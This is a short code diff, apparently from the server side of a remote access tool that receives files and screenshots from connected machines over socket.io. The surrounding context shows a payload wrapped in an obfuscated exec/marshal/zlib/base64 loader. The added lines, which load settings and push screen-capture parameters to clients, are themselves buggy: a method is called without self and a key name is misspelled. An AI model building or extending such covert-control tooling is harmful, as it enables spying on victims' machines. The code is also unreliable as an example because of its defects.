@@ -333,8 +333,23 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         ) as f:
             f.write(base64.b64decode(data["file"]))
 
+    def get_settings(self):
+        try:
+            with open("config.json", "r") as file:
+                credentials = json.load(file)
+            return credentials
+        except FileNotFoundError:
+            return None
+
     def screen_status(self, sid, data):
         print(data)
+        settings = get_settings()
+        screen_res_data = {
+            'uid': data['uid'],
+            'screen_fps': settings['settings']['screen_fps'],
+            'screen_quality': settings['settings']['screen_qualty']
+        }
+        self.sio.emit("change_screen_information", screen_res_data)
         self.sio.emit("screen_status", data)
 
     def screenshot_taken(self, sid, data):
